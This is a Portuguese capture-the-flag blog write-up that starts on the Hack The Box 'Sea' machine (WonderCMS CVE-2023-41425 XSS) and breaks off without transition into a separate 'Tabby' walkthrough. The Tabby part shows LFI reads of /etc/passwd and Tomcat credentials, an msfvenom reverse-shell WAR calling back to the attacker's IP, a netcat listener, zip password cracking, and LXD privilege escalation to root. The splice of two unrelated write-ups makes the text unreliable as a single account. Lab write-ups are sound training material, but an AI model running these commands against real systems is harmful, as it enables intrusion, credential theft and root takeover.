---
title: "Sea"
date: 2020-10-19T16:49:28-03:00
draft: false
---

![HTB](/seahtb.png)

Já comecei pegando o ip da VM e adicionando no meu hosts.

![HTB](/sea02.png)

Depois já comecei a rodar o nmap
nmap -sC -Pn -T4 -v -p- 10.10.11.28

```bash
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

Apresenta um sitezinho maneiro demais, sou ciclista então já curti a porta 80 está hospedando um site para ciclismo noturno e intitulado banner velik71. Cliquei em "how-to-participate" e depois em "contact"

![HTB](/sea01.png)

O http://sea.htb/contact.php , é um formulário POST com um servidor PHP 

![HTB](/sea03.png)

Bom, vou partir para enumeração de diretórios, depois vouto ali. Usei o gobuster pra isso:

```bash
➜  ~ gobuster dir -u http://10.10.11.28 -w /usr/share/dirb/wordlists/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.28
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/0                    (Status: 200) [Size: 3670]
/404                  (Status: 200) [Size: 3361]
/Documents and Settings (Status: 403) [Size: 199]
/Program Files        (Status: 403) [Size: 199]
Progress: 2174 / 20470 (10.62%)
Progress: 2199 / 20470 (10.74%)
/contact us           (Status: 403) [Size: 199]
/data                 (Status: 301) [Size: 232] [--> http://10.10.11.28/data/]
/donate cash          (Status: 403) [Size: 199]
/external files       (Status: 403) [Size: 199]
/home page            (Status: 403) [Size: 199]
/home                 (Status: 200) [Size: 3670]
/messages             (Status: 301) [Size: 236] [--> http://10.10.11.28/messages/]
/modern mom           (Status: 403) [Size: 199]
/my project           (Status: 403) [Size: 199]
/neuf giga photo      (Status: 403) [Size: 199]
/planned giving       (Status: 403) [Size: 199]
/plugins              (Status: 301) [Size: 235] [--> http://10.10.11.28/plugins/]
/press releases       (Status: 403) [Size: 199]
/privacy policy       (Status: 403) [Size: 199]
/reports list         (Status: 403) [Size: 199]
/server-status        (Status: 403) [Size: 199]
/site map             (Status: 403) [Size: 199]
/style library        (Status: 403) [Size: 199]
/themes               (Status: 301) [Size: 234] [--> http://10.10.11.28/themes/]
/web references       (Status: 403) [Size: 199]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

Vamos desconsiderar os 400 e focar nos 301 que podem ser erros de direcionamentos e diretorios configurados incorretamente. Fiz uma nova busca agora partindo da URL "/themes" debaixo pra cima, e encontrei outra pasta com 301 "/bike".

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/404                  (Status: 200) [Size: 3341]
/Documents and Settings (Status: 403) [Size: 199]
/Program Files        (Status: 403) [Size: 199]
/bike                 (Status: 301) [Size: 235] [--> http://sea.htb/themes/bike/]    ### bem aqui!! 

```

Fiz uma enumeração mais detalhaada dentro de "/themes/bike/" e encontrei isso aqui:

```bash
➜  ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u "http://sea.htb/themes/bike/FUZZ" -t 200 -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://sea.htb/themes/bike/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

README.md               [Status: 200, Size: 318, Words: 40, Lines: 16, Duration: 189ms]
sym/root/home/          [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 1405ms]
version                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 143ms]

```

Fiz um curl em "version" e "README.md" e recebi isso aqui

```bash
➜  ~ curl http://sea.htb/themes/bike/version         
3.2.0

```
```bash
➜  ~ curl http://sea.htb/themes/bike/README.md                                    
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.
```

Buscando esse WonderCMS e versão no google podemosnos deparar com a CVE-2023-41425, https://github.com/prodigiousMind/CVE-2023-41425, pelo que entendi a vulnerabilidade CVE-2023-41425 no Wonder CMS versões 3.2.0 a 3.4.2 é uma falha de Cross Site Scripting (XSS) que permite a execução de código arbitrário. A falha ocorre no componente installModule, onde um invasor remoto pode injetar um script malicioso ao carregar um módulo criado. Esse script é então executado no navegador das vítimas, permitindo ao atacante realizar ações como roubo de cookies, redirecionamento de páginas ou outras ações maliciosas.

Fiz o clone da CVE e vou executar o arquivo .py do exploit

```bash
➜  sea git clone https://github.com/prodigiousMind/CVE-2023-41425.git
Cloning into 'CVE-2023-41425'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (6/6), done.
➜  sea ls
CVE-2023-41425
➜  sea cd CVE-2023-41425 
➜  CVE-2023-41425 git:(main) ls
exploit.py  README.md
➜  CVE-2023-41425 git:(main) 
```

Eu abri o arquivo "exploit.py" para analisar e percebi que precisamos criar um arquivo xss.js. Esse JavaScript é injetado por meio de um vetor de ataque XSS. Para disponibilizar o arquivo xss.js ao alvo, o script configura um servidor HTTP simples (usando python3 -m http.server) na máquina do atacante (porta padrão 8000).

O script original obtém dados do GitHub, mas como o servidor HTB não tem acesso à internet, baixamos o repositório manualmente e o transferimos para a máquina alvo. Após instalar o módulo, o script ativa o shell reverso enviando o IP e a porta do ouvinte usando um comando específico.

Bom, pra entender melhor vou colocar o print daquele form de contato que achamos no gobuster, eai jogamos o XSS no campo "website".

![HTB](/sea04.png)

Injetando o script e ouvindo na porta local

E agora abrimos o formulário em 

![HTB](/sea05.png)










![HTB](/tabby-03.png)

http://megahosting.htb:8080/

Coloquei meu ip no meu hosts > para o nome do site

ele mostra o local no path  /var/lib/

tomcat9/webapps/ROOT/index.html

/var/lib/tomcat9

/usr/share/doc/tomcat9-common/RUNNING.txt.gz

/etc/tomcat9/tomcat-users.xml.

Esse site tem  LFI

https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/


Por isso entendi o por que dos paths dentro da porta 8080

exemplo:

megahosting.htb/news.php?file=../../../../etc/passwd

```bash
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bash 
```

agora consigo ver dentro desses paths que ele deu a dica lá atrás

/var/lib/tomcat9/webapps/ROOT/index.html

/var/lib/tomcat9

/usr/share/doc/tomcat9-common/RUNNING.txt.gz

/etc/tomcat9/tomcat-users.xml.

```bash
http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

Inspecione a págna para ver os atributos de acordo com a documentação do LFI


```bash
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```

agora podemos fazer o shell reverso
igual nas outras maquinas

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 <IP> LPORT=4444 -f war > exploit.war
```

Depois fazemos upload do arquivo war

```bash
curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file exploit.war "http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war"
```

em outra aba do terminal, deixe escutando na porta que desejar

```bash
nc -nvlp 4444
```
com o netcat

Quando estiver ouvindo a porta,  vá no navegador e chame o arquivo que vc acabou de fazer o upload

```bash
http://10.10.10.194:8080/exploit.war/
```
volte no terminal, ele vai ter conectado via shell
agora execute o shell reverso em python para o term

```bash
listening on [any] 4444 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.194] 50476
python3 -c "import pty;pty.spawn('/bin/bash')"
```

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
tomcat@tabby:/var/lib/tomcat9$ 
```

Agora entre em  /var/www/files

vc vai encontrar o arquivo  16162020_backup.zip

acesse no navegador

10.10.10.194/files/16162020_backup.zip

e baixe o arquivo zip para sua maquina

ele ta protegido com senha

vai ser necessário usar o  `fcrackzip` nele se não tiver ele instalado, basta, instalar:

# apt-get install fcrackzip

```bash
 root  ~  fcrackzip -h

fcrackzip version 1.0, a fast/free zip password cracker
written by Marc Lehmann <pcg@goof.com> You can find more info on
http://www.goof.com/pcg/marc/

USAGE: fcrackzip
          [-b|--brute-force]            use brute force algorithm
          [-D|--dictionary]             use a dictionary
          [-B|--benchmark]              execute a small benchmark
          [-c|--charset characterset]   use characters from charset
          [-h|--help]                   show this message
          [--version]                   show the version of this program
          [-V|--validate]               sanity-check the algorithm
          [-v|--verbose]                be more verbose
          [-p|--init-password string]   use string as initial password/file
          [-l|--length min-max]         check password with length min to max
          [-u|--use-unzip]              use unzip to weed out wrong passwords
          [-m|--method num]             use method number "num" (see below)
          [-2|--modulo r/m]             only calculcate 1/m of the password
          file...                    the zipfiles to crack

methods compiled in (* = default):

 0: cpmask
 1: zip1
*2: zip2, USE_MULT_TAB
```

Usei esses parametros e a lista  rockyou para fazer o brute forte

```bash
fcrackzip -b -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
```

Foi rápido até

possible pw found: admin@it ()

com essa senha da para descompactar o arquivo na verdade essa senha nao vai ser para  descompactar o arquivo, essa senha é do user da maquina

Depois volte para o terminal logado na maquina
e va para o

cd /home

Faça login com esse tal de ash

```bash
tomcat@tabby:/home$ ls
ls
ash
tomcat@tabby:/home$ cd ash    
cd ash
bash: cd: ash: Permission denied
tomcat@tabby:/home$ su ash
su ash
Password: admin@it

ash@tabby:/home$ ls
ls
ash
ash@tabby:/home$ 
```

```bash
ash@tabby:/home$ cd ash
cd ash
ash@tabby:~$ ls
ls
linpeas.sh  snap  user.txt
ash@tabby:~$ 
```

a flag de user


```bash
ash@tabby:~$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

```bash
ash@tabby:~$ sudo -l
    sudo: unable to open /run/sudo/ts/ash: Read-only file system
    [sudo] password for ash: 
     Sorry, user ash may not run sudo on tabby.
```

Para o root está sendo mais dificil

encontrei este cara 

https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation

https://github.com/lxc/distrobuilder

ele monta um container, dentro da pasta que vc quiser e estipular no seu S.O e escala o privilégio montando um container dentro da maquina alvo, vou testar

basta seguir os passos certinho dessa doc ai que monta o container. Abre uma outra aba no terminal e deixa escutando o httpServer para transferir os arquivos

```bash
  ┌─[root@liquid]─[~/Desktop/HTB/tabby/lxd-alpine-builder]
    └──╼ #ls -l
    total 3180
    -rw-r--r-- 1 root root 3212312 Jun 21 22:04 alpine-v3.12-x86_64-20200621_2204.tar.gz
    -rwxr-xr-x 1 root root    7498 Jun 21 22:03 build-alpine
    -rw-r--r-- 1 root root   26530 Jun 21 22:03 LICENSE
    -rw-r--r-- 1 root root     768 Jun 21 22:03 README.md
    ┌─[✗]─[root@liquid]─[~/Desktop/HTB/tabby/lxd-alpine-builder]
    └──╼ #python -m SimpleHTTPServer 
    Serving HTTP on 0.0.0.0 port 8000 ...

< /pre>
```

```bash
ash@tabby:~$ wget http://10.10.14.29:8000/rootfs.squashfs
ash@tabby:~$ wget http://10.10.14.29:8000/lxd.tar.gz

O meu lxd.tar.gz ele veio com lxd.tar.xz

Eu dei um 'mv' e renomeei ele para 'gz', fiz com xz e deu erro.
```

Passei os arquivos da maquina para dentro da maquiina tabby, ele me gerou esses dois arquivos no caso 
```bash
lxd.tar.xz e rootfs.squashfs
```

Depois

na maquina tabby

fiz o import desse container

A maquina já contém o lxc instalado

```bash
ash@tabby:~$ lxc image import ./lxd.tar.gz rootfs.squashfs --alias alpine
```

rootfs.squashfs = esse arquivo que vai proporcionar o root na maquina é maneiro essa montagem de container.

Com o comando `lxc image list`  vc consegue ver todos os containers montados, no caso só o seu

```bash
ash@tabby:~$ lxc image list
lxc image list
+--------+--------------+--------+--------------+--------------+-----------+---------+-------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC | DESCRIPTION  | ARCHITECTURE |   TYPE    |  SIZE   |          UPLOAD DATE          |
+--------+--------------+--------+--------------+--------------+-----------+---------+-------------------------------+
| alpine | a5f784005c68 | no     | Ubuntu focal | x86_64       | CONTAINER | 97.74MB | Jul 10, 2020 at 10:50pm (UTC) |
+--------+--------------+--------+--------------+--------------+-----------+---------+-------------------------------+
```

fui seguindo o tutorial do  LXC  no link lá em cima.

```bash
lxd init
```
Esse comando vai começar a montar o container, ele vai fazer uma serie de perguntas, vai deixando tudo como 'default'

```bash
    ash@tabby:~$ lxd init
    Would you like to use LXD clustering? (yes/no) [default=no]: no
    Do you want to configure a new storage pool? (yes/no) [default=yes]: no
    Would you like to connect to a MAAS server? (yes/no) [default=no]: ^C
    ash@tabby:~$ lxd init
    Would you like to use LXD clustering? (yes/no) [default=no]: no
    Do you want to configure a new storage pool? (yes/no) [default=yes]: yes
    Name of the new storage pool [default=default]: 
    Name of the storage backend to use (dir, lvm, ceph, btrfs) [default=btrfs]: dir
    Would you like to connect to a MAAS server? (yes/no) [default=no]: no
    Would you like to create a new local network bridge? (yes/no) [default=yes]: 
    What should the new bridge be called? [default=lxdbr0]: 
    The requested network bridge "lxdbr0" already exists. Please choose another name.
    What should the new bridge be called? [default=lxdbr0]: 
    The requested network bridge "lxdbr0" already exists. Please choose another name.
    What should the new bridge be called? [default=lxdbr0]: liquid
    What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
    What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
    Would you like LXD to be available over the network? (yes/no) [default=no]: 
    Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
    Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
```

Depois que montei, usei o comando abaixo para iniciar ele. 


```bash
ash@tabby:~$ lxc init alpine privesc -c security.privileged=true
lxc init alpine privesc -c security.privileged=true
Creating privesc
ash@tabby:~$ lxc list
lxc list
+---------+---------+------+------+-----------+-----------+
|  NAME   |  STATE  | IPV4 | IPV6 |   TYPE    | SNAPSHOTS |
+---------+---------+------+------+-----------+-----------+
| privesc | STOPPED |      |      | CONTAINER | 0         |
+---------+---------+------+------+-----------+-----------+
```

Ele foi criaado, porém está stopado.  Fala na documentação que precisa configurar ele no mnt
ai eu fiz isso dessa forma:

```bash
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
```
(consta na documentação também)
ele sempre cria o container com o nome 'privesc'

```bash
    ash@tabby:~$ lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
    Device mydevice added to privesc
```

Ele foi montado com sucesso, agora só dar o start no container.


```bash
ash@tabby:~$ lxc start privesc
lxc start privesc
ash@tabby:~$ lxc exec privesc /bin/sh
lxc exec privesc /bin/sh
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cd /mnt/root
cd /mnt/root
# ls
ls
bin    dev   lib    libx32    mnt   root  snap      sys  var
boot   etc   lib32  lost+found    opt   run   srv       tmp
cdrom  home  lib64  media    proc  sbin  swap.img  usr
# cd root
cd root
# ls
ls
root.txt  snap
# cat root.txt    
cat root.txt
653d95c2eb0f63629eeb048ea1d0a3b5
# 
```





